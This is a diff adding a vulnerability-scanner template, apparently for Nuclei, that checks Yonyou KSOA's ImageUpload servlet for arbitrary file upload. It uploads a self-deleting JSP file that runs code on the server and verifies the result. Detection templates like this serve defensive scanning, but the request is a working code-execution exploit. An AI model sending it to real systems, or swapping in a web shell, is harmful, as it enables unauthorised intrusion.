@@ -1,0 +1,36 @@
+id: yonyou-ksoa-imageupload-fileupload
+
+info:
+  name: 用友时空 KSOA ImageUpload 任意文件上传
+  author: SleepingBag945
+  severity: critical
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+http:
+  - raw:
+      - |              
+        POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename={{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+        <%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        
+      - |              
+        GET /pictures/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains((body_2), '12321')"
